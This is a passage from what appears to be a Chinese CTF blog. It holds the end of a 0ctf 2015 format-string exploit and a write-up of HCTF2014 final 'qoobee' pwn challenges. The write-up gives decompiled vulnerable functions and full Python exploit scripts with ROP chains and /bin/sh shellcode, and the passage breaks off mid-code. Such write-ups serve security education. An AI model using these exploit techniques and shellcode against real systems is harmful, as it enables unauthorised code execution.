class="number">8</span>) &amp; <span class="number">0xff</span></div><div class="line">t = <span class="number">0x100</span> * i + t - sum</div><div class="line">sum += t</div><div class="line">p += <span class="string">'%0'</span></div><div class="line">p += str(t)</div><div class="line">p += <span class="string">'x'</span></div><div class="line">p += <span class="string">'%'</span></div><div class="line">p += <span class="string">'%d'</span> % (<span class="number">40</span> + i)</div><div class="line">p += <span class="string">'$n'</span></div><div class="line"></div><div class="line">p2 = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">p2 += l64(retaddr+i)</div><div class="line"></div><div class="line">io.writeline(p)</div><div class="line">io.read_until(<span class="string">'Password: '</span>)</div><div class="line">io.writeline(p2)</div><div class="line"></div><div class="line">io.read_until(<span class="string">'0ctf'</span>)</div><div class="line">io.interact()</div></pre></td></tr></table></figure>
<p>flag:<strong>0ctf{login_success_and_welcome_back}</strong></p>

                    
                        
                    
                    
                        <p>
                            <a href="/writeups/0ctf-2015-writeup/#post-footer" class="postShorten-excerpt_link link">
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/writeups/hctf2014final-qoobee-writeup/">
                            HCTF2014 FINAL 之pwn题qoobee1-6 writeup
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2015-01-11T21:16:34+08:00">
	
		    Jan 11, 2015
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/writeups/">writeups</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <p>整理题目的时候把HCTF2014 FINAL的qoobee全部做了一遍。 做的时候没有顺序，利用代码也没好好写。。。超级乱。。。看者见谅。。。</p>
<h1 id="Qoobee"><a href="#Qoobee" class="headerlink" title="Qoobee"></a>Qoobee</h1><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>其实程序还隐藏了一个-214号功能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> \_\_cdecl fun214\_sub_80495A9()</div><div class="line">&#123;</div><div class="line">  FILE *v0; <span class="comment">// ST34_4@7</span></div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@8</span></div><div class="line">  <span class="keyword">char</span> v2; <span class="comment">// \[sp+Bh\] \[bp-1Dh\]@3</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// \[sp+Ch\] \[bp-1Ch\]@1</span></div><div class="line">  <span class="keyword">void</span> *haystack; <span class="comment">// \[sp+18h\] \[bp-10h\]@1</span></div><div class="line"></div><div class="line">  v3 = <span class="number">0</span>;</div><div class="line">  haystack = mmap((<span class="keyword">void</span> *)<span class="number">0x80000000</span>, <span class="number">0x1000</span>u, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Oh! You can leave a message for author(the real QooBee) here: "</span>);</div><div class="line">  <span class="keyword">do</span></div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">150</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    v2 = getchar();</div><div class="line">    <span class="keyword">if</span> ( (\*\_\_ctype\_b\_loc())\[v2\] &amp; <span class="number">0x400</span> || (\*\_\_ctype\_b\_loc())\[v2\] &amp; <span class="number">0x800</span> )</div><div class="line">      *((_BYTE *)haystack + v3++) = v2;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">while</span> ( sub_8048CD0(v2) );</div><div class="line">  v0 = fopen(<span class="string">"/tmp/qoobee/message_log"</span>, <span class="string">"a+"</span>);</div><div class="line">  <span class="built_in">fprintf</span>(v0, <span class="string">"%sn"</span>, haystack);</div><div class="line">  fclose(v0);</div><div class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)haystack, <span class="string">"ymkelwin"</span>) )</div><div class="line">  &#123;</div><div class="line">    result = ((<span class="keyword">int</span> (*)(<span class="keyword">void</span>))haystack)();</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Received: %sn"</span>, haystack);</div><div class="line">    result = <span class="built_in">puts</span>(<span class="string">"Thank you!"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以执行代码，需要构造全ascii的shellcode，字符串里要含有ymkelwin(yinmo kelwin?LEOC和kelwin不能说的秘密?)</p>
<h2 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="string">'''</span></div><div class="line">function -214 </div><div class="line">patched in qoobee2</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</div><div class="line"></div><div class="line">target = <span class="string">'./qoobee'</span></div><div class="line">io = zio(target)</div><div class="line"></div><div class="line">read_buf = l32(<span class="number">0x804c090</span>)</div><div class="line">call_edx = l32(<span class="number">0x0804887d</span>)</div><div class="line">str_flag = l32(<span class="number">0x08049F7E</span>)</div><div class="line">str_r = l32(<span class="number">0x08049F7C</span>)</div><div class="line">s = l32(<span class="number">0xffffce8d</span>)</div><div class="line">extern = l32(<span class="number">0x0804b7cc</span>)</div><div class="line">leave_ret = l32(<span class="number">0x08048a4f</span>)</div><div class="line">ppr = l32(<span class="number">0x0804992a</span>)</div><div class="line">pppr = l32(<span class="number">0x08049929</span>)</div><div class="line">\<span class="comment"># gen by alpha2 baseaddr is eax</span></div><div class="line">shellcode = <span class="string">"PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIFQo9kGyqNP4KrqPhDoToD3sXaxtoSRbIPnK9yszmK0wzA"</span></div><div class="line">\<span class="comment"># shellcode2  tiny sh without x0b</span></div><div class="line">shellcode2 = <span class="string">"x31xc9xf7xe1xb0xf4xf6xd0x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"</span></div><div class="line">read_got = l32(<span class="number">0x08048660</span>)</div><div class="line">fopen_got = l32(<span class="number">0x08048780</span>)</div><div class="line">write_got = l32(<span class="number">0x08048760</span>)</div><div class="line">data = l32(<span class="number">0x0804B7A8</span>)</div><div class="line">bss = l32(<span class="number">0x0804b7c0</span>)</div><div class="line">memcpy_got = l32(<span class="number">0x08048690</span>)</div><div class="line">mmap_got =l32(<span class="number">0x08048730</span>)</div><div class="line"></div><div class="line">payload =<span class="string">''</span></div><div class="line"></div><div class="line">\<span class="comment"># mmap</span></div><div class="line">payload += <span class="string">'-214n'</span></div><div class="line"></div><div class="line">\<span class="comment"># read shellcode to exec</span></div><div class="line">payload += shellcode+<span class="string">'ymkelwinn'</span></div><div class="line"></div><div class="line">\<span class="comment"># print payload</span></div><div class="line">io.write(payload)</div><div class="line">io.interact()</div></pre></td></tr></table></figure>
<h1 id="Qoobee2"><a href="#Qoobee2" class="headerlink" title="Qoobee2"></a>Qoobee2</h1><p>补上了上一个漏洞，去掉了执行代码，但是还是mmap了可执行的内存</p>
<h2 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h2><p>功能1中输入name存在溢出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> \_\_cdecl sub\_804970E(<span class="keyword">int</span> a1)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@4</span></div><div class="line">  <span class="keyword">char</span> v2\[<span class="number">12</span>\]; <span class="comment">// \[sp+1Ch\] \[bp-3Ch\]@1</span></div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// \[sp+28h\] \[bp-30h\]@1</span></div><div class="line">  <span class="keyword">int</span> i; <span class="comment">// \[sp+4Ch\] \[bp-Ch\]@1</span></div><div class="line"></div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Now input the information for your QooBee Dragon:"</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"QooBee Name: "</span>);</div><div class="line">  \_\_isoc99\_scanf(<span class="string">"%s"</span>, v2);                     <span class="comment">// stack overflow</span></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"QooBee Age: "</span>);</div><div class="line">  \_\_isoc99\_scanf(<span class="string">"%d"</span>, &amp;v3);</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; v2\[i\]; ++i )</div><div class="line">    *(_BYTE *)(a1 + i + <span class="number">20</span>) = v2\[i\];</div><div class="line">  result = a1;</div><div class="line">  *(_DWORD *)(a1 + <span class="number">32</span>) = v3;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>利用-214功能中的mmap开辟的可执行缓冲区执行shellcode。 写exp的时候用了ret2libc的方法，没有直接用上一种方法的shellcode</p>
<h2 id="利用代码-1"><a href="#利用代码-1" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line"><span class="string">'''</span></div><div class="line">name stack overflow</div><div class="line">patched in qoobee3</div><div class="line">'''</div><div class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</div><div class="line"></div><div class="line">target = <span class="string">'./qoobee'</span></div><div class="line">io = zio(target)</div><div class="line"></div><div class="line">read_buf = l32(<span class="number">0x804c090</span>)</div><div class="line">call_edx = l32(<span class="number">0x0804887d</span>)</div><div class="line">str_flag = l32(<span class="number">0x08049F7E</span>)</div><div class="line">str_r = l32(<span class="number">0x08049F7C</span>)</div><div class="line">s = l32(<span class="number">0xffffce8d</span>)</div><div class="line">extern = l32(<span class="number">0x0804b7cc</span>)</div><div class="line">leave_ret = l32(<span class="number">0x08048a4f</span>)</div><div class="line">ppr = l32(<span class="number">0x0804992a</span>)</div><div class="line">pppr = l32(<span class="number">0x08049929</span>)</div><div class="line">\<span class="comment"># shellcode tiny sh</span></div><div class="line">shellcode = <span class="string">"x31xc9xf7xe1xb0x0bx51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"</span></div><div class="line">read_got = l32(<span class="number">0x08048660</span>)</div><div class="line">fopen_got = l32(<span class="number">0x08048780</span>)</div><div class="line">write_got = l32(<span class="number">0x08048760</span>)</div><div class="line">data = l32(<span class="number">0x0804B7A8</span>)</div><div class="line">bss = l32(<span class="number">0x0804b7c0</span>)</div><div class="line">memcpy_got = l32(<span class="number">0x08048690</span>)</div><div class="line">mmap_got =l32(<span class="number">0x08048730</span>)</div><div class="line"></div><div class="line">payload =<span class="string">''</span></div><div class="line"></div><div class="line">\<span class="comment"># function -214 mmap</span></div><div class="line">payload += <span class="string">'-214n'</span></div><div class="line">payload += <span class="string">'9999999n'</span></div><div class="line"></div><div class="line">\<span class="comment"># function 1</span></div><div class="line">payload += <span class="string">'1n'</span></div><div class="line"></div><div class="line">\<span class="comment"># junk</span></div><div class="line">payload += <span class="string">'x00'</span> + <span class="string">'x90'</span>*<span class="number">59</span> <span class="comment">#2222</span></div><div class="line"></div><div class="line">\<span class="comment"># ebp</span></div><div class="line">payload += l32(<span class="number">0x804b7e0</span>)</div><div class="line"></div><div class="line">\<span class="comment"># eip read</span></div><div class="line">payload += read_got</div><div class="line"></div><div class="line">\<span class="comment"># read ret to 0x80000004</span></div><div class="line">payload += l32(<span class="number">0x80000004</span>)</div><div class="line"></div><div class="line">\<span class="comment"># read args</span></div><div class="line">payload += l32(<span class="number">0x0</span>)</div><div class="line">payload += l32(<span class="number">0x80000000</span>)</div><div class="line">payload += l32(<span class="number">0x80</span>)</div><div class="line">payload += <span class="string">'n'</span></div><div class="line"></div><div class="line">\<span class="comment"># input age</span></div><div class="line">payload += <span class="string">'aaaan'</span></div><div class="line"></div><div class="line">\<span class="comment"># read shellcode to exec</span></div><div class="line">payload += shellcode</div><div class="line"></div><div class="line">io.write(payload)</div><div class="line">io.interact()</div></pre></td></tr></table></figure>
<h1 id="Qoobee3"><a href="#Qoobee3" class="headerlink" title="Qoobee3"></a>Qoobee3</h1><p>修补了上个漏洞</p>
<h2 id="利用分析-2"><a href="#利用分析-2" class="headerlink" title="利用分析"></a>利用分析</h2><p>打工输入指令过滤存在问题，可以写栈内存</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> \_\_cdecl fun5\_sub_8048F93(<span class="keyword">int</span> a1)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@14</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// \[sp+0h\] \[bp-58h\]@2</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// \[sp+0h\] \[bp-58h\]@5</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> k; <span class="comment">// \[sp+0h\] \[bp-58h\]@9</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// \[sp+4h\] \[bp-54h\]@1</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// \[sp+8h\] \[bp-50h\]@1</span></div><div class="line">  <span class="keyword">int</span> op; <span class="comment">// \[sp+Ch\] \[bp-4Ch\]@8</span></div><div class="line">  <span class="keyword">int</span> v8; <span class="comment">// \[sp+10h\] \[bp-48h\]@1</span></div><div class="line">  <span class="keyword">int</span> v9; <span class="comment">// \[sp+14h\] \[bp-44h\]@1</span></div><div class="line">  <span class="keyword">int</span> v10; <span class="comment">// \[sp+18h\] \[bp-40h\]@1</span></div><div class="line">  <span class="keyword">int</span> v11; <span class="comment">// \[sp+1Ch\] \[bp-3Ch\]@1</span></div><div class="line">  <span class="keyword">int</span> v12\[<span class="number">4</span>\]; <span class="comment">// \[sp+20h\] \[bp-38h\]@3</span></div><div class="line">  <span class="keyword">int</span> v13\[<span class="number">4</span>\]; <span class="comment">// \[sp+30h\] \[bp-28h\]@3</span></div><div class="line">  <span class="keyword">char</span> *format; <span class="comment">// \[sp+40h\] \[bp-18h\]@1</span></div><div class="line">  <span class="keyword">int</span> v15; <span class="comment">// \[sp+44h\] \[bp-14h\]@1</span></div><div class="line">  <span class="keyword">int</span> v16; <span class="comment">// \[sp+48h\] \[bp-10h\]@1</span></div><div class="line">  <span class="keyword">int</span> v17; <span class="comment">// \[sp+4Ch\] \[bp-Ch\]@1</span></div><div class="line"></div><div class="line">  v8 = <span class="number">0</span>;</div><div class="line">  v9 = <span class="number">0</span>;</div><div class="line">  v10 = <span class="number">0</span>;</div><div class="line">  v11 = <span class="number">0</span>;</div><div class="line">  v5 = <span class="number">0</span>;</div><div class="line">  v6 = <span class="number">0</span>;</div><div class="line">  format = <span class="string">"0. Moving bricks: $%d/1h (spend %d Vit)n"</span>;</div><div class="line">  v15 = (<span class="keyword">int</span>)<span class="string">"1. Sell Meng: $%d/1h (spend %d Vit)n"</span>;</div><div class="line">  v16 = (<span class="keyword">int</span>)<span class="string">"2. Capture the Flag: $%d/1h (spend %d Vit)n"</span>;</div><div class="line">  v17 = (<span class="keyword">int</span>)<span class="string">"3. Pwnning: $%d/1h (spend %d Vit)n"</span>;</div><div class="line">  <span class="keyword">if</span> ( a1 )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</div><div class="line">    &#123;</div><div class="line">      v12\[i\] = get_randnum(<span class="number">75</span>, <span class="number">150</span>);</div><div class="line">      v13\[i\] = get_randnum(<span class="number">50</span>, <span class="number">150</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</div><div class="line">      <span class="built_in">printf</span>((&amp;format)\[<span class="number">4</span> * j\], v12\[j\], v13\[j\]);</div><div class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"Which one you want QooBee to work(99 to leave)? "</span>);</div><div class="line">      op = safe_readint();</div><div class="line">      <span class="keyword">if</span> ( op == <span class="number">99</span> )</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"How long for this one? "</span>);</div><div class="line">      *(&amp;v8 + op) = safe_readint();             <span class="comment">// write dowrod in stack</span></div><div class="line">                                                <span class="comment">// patched in qoobee4</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">3</span>; ++k )</div><div class="line">    &#123;</div><div class="line">      v6 += v13\[k\] * *(&amp;v8 + k);</div><div class="line">      v5 += v12\[k\] * *(&amp;v8 + k);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">16</span>) &lt; v6 )</div><div class="line">    &#123;</div><div class="line">      result = <span class="built_in">puts</span>(<span class="string">"5555...Your QooBee's vit is too low..He need have a rest!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      *(_DWORD *)(a1 + <span class="number">16</span>) -= v6;</div><div class="line">      *(_DWORD *)a1 += v5;</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"Your baby earned $%d..n"</span>, v5);</div><div class="line">      result = <span class="built_in">printf</span>(<span class="string">"Total Money: $%d !n"</span>, *(_DWORD *)a1);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    result = <span class="built_in">puts</span>(<span class="string">"You need adopt a QooBee Dragon first!"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>写入ROP链 ROP调用mmap read之后执行shellcode</p>
<h2 id="利用代码-2"><a href="#利用代码-2" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line"><span class="string">'''</span></div><div class="line">function 5 work</div><div class="line">patched in qoobee4</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line">target = <span class="string">'./qoobee'</span></div><div class="line">io = zio(target, timeout=<span class="number">800000</span>)</div><div class="line"></div><div class="line">read_buf = l32(<span class="number">0x804c090</span>)</div><div class="line">call_edx = l32(<span class="number">0x0804887d</span>)</div><div class="line">str_flag = l32(<span class="number">0x08049F7E</span>)</div><div class="line">str_r = l32(<span class="number">0x08049F7C</span>)</div><div class="line">s = l32(<span class="number">0xffffce8d</span>)</div><div class="line">extern = l32(<span class="number">0x0804b7cc</span>)</div><div class="line">leave_ret = l32(<span class="number">0x08048a4f</span>)</div><div class="line">pr = l32(<span class="number">0x08048bc6</span>)</div><div class="line">ppr = l32(<span class="number">0x0804992a</span>)</div><div class="line">pppr = l32(<span class="number">0x08049929</span>)</div><div class="line">p7r = l32(<span class="number">0x08049925</span>)</div><div class="line">read_got = l32(<span class="number">0x08048660</span>)</div><div class="line">fopen_got = l32(<span class="number">0x08048780</span>)</div><div class="line">write_got = l32(<span class="number">0x08048760</span>)</div><div class="line">data = l32(<span class="number">0x0804B7A8</span>)</div><div class="line">bss = l32(<span class="number">0x0804b7c0</span>)</div><div class="line">memcpy_got = l32(<span class="number">0x08048690</span>)</div><div class="line">mmap_got =l32(<span class="number">0x08048730</span>)</div><div class="line"></div><div class="line">\<span class="comment"># -214 mmap 0x80000000</span></div><div class="line">io.writeline(<span class="string">'-214'</span>)</div><div class="line">io.writeline(<span class="string">'hello'</span>)</div><div class="line"></div><div class="line">\<span class="comment"># adopt qoobee</span></div><div class="line">io.writeline(<span class="string">'1'</span>)</div><div class="line">io.writeline(<span class="string">'1'</span>)</div><div class="line">io.writeline(<span class="string">'1'</span>)</div><div class="line">io.writeline(<span class="string">'1'</span>)</div><div class="line">io.read_until(<span class="string">'Your Choice:'</span>)</div><div class="line"></div><div class="line">\<span class="comment"># work</span></div><div class="line">io.writeline(<span class="string">'5'</span>)</div><div class="line"></div><div class="line">payload = \[</div><div class="line">\<span class="comment"># ebp</span></div><div class="line">l32(<span class="number">0x21000000</span>),</div><div class="line">\<span class="comment"># eip jmp pr</span></div><div class="line">pr,</div><div class="line">\<span class="comment"># a1</span></div><div class="line">l32(<span class="number">0x80000000</span>),</div><div class="line">\<span class="comment"># mmap</span></div><div class="line">mmap_got,</div><div class="line">\<span class="comment"># p7r</span></div><div class="line">p7r,</div><div class="line">\<span class="comment"># mmap args</span></div><div class="line">l32(<span class="number">0x21000000</span>), l32(<span class="number">0x100</span>), l32(<span class="number">7</span>), l32(<span class="number">50</span>), l32(<span class="number">-1</span>), l32(<span class="number">0</span>),</div><div class="line">l32(<span class="number">0</span>), <span class="comment">#padding</span></div><div class="line">\<span class="comment"># read</span></div><div class="line">read_got,</div><div class="line">\<span class="comment"># jmp shellcode</span></div><div class="line">l32(<span class="number">0x21000000</span>),</div><div class="line">\<span class="comment"># read args</span></div><div class="line">l32(<span class="number">0</span>), l32(<span class="number">0x21000000</span>), l32(<span class="number">0x100</span>),</div><div class="line">\]</div><div class="line"></div><div class="line"><span class="keyword">print</span> payload</div><div class="line"></div><div class="line">i = <span class="number">0</span></div><div class="line">\<span class="comment"># io.gdb_hint()</span></div><div class="line"><span class="keyword">for</span> dword <span class="keyword">in</span> payload:</div><div class="line">    io.read_until(<span class="string">'Which one you want QooBee to work(99 to leave)?'</span>)</div><div class="line">    io.writeline(<span class="string">"%d"</span> % (<span class="number">18</span>+i))</div><div class="line">    io.read_until(<span class="string">'How long for this one?'</span>)</div><div class="line">    io.writeline(<span class="string">"%u"</span> % struct.unpack(<span class="string">'&lt;i'</span>, dword))</div><div class="line">    i += <span class="number">1</span></div><div class="line"></div><div class="line">io.writeline(<span class="string">'99'</span>)</div><div class="line">io.writeline(shellcode2)</div><div class="line"></div><div class="line">io.interact()</div></pre></td></tr></table></figure>
<h1 id="Qoobee4"><a href="#Qoobee4" class="headerlink" title="Qoobee4"></a>Qoobee4</h1><h2 id="利用分析-3"><a href="#利用分析-3" class="headerlink" title="利用分析"></a>利用分析</h2><p>fun1的输入description栈溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> \_\_cdecl sub\_8048BC8(<span class="keyword">int</span> a1)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v1; <span class="comment">// ST28_4@1</span></div><div class="line">  <span class="keyword">int</span> v2; <span class="comment">// ecx@1</span></div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@1</span></div><div class="line">  <span class="keyword">char</span> src; <span class="comment">// \[sp+1Eh\] \[bp-2Ah\]@1</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// \[sp+3Ch\] \[bp-Ch\]@1</span></div><div class="line"></div><div class="line">  v5 = *MK\_FP(\_\_GS__, <span class="number">20</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Description(%d bytes): "</span>, <span class="number">30</span>);        <span class="comment">// stack overflow</span></div><div class="line">  v1 = safe_read(&amp;src, <span class="number">100</span>);</div><div class="line">  <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(a1 + <span 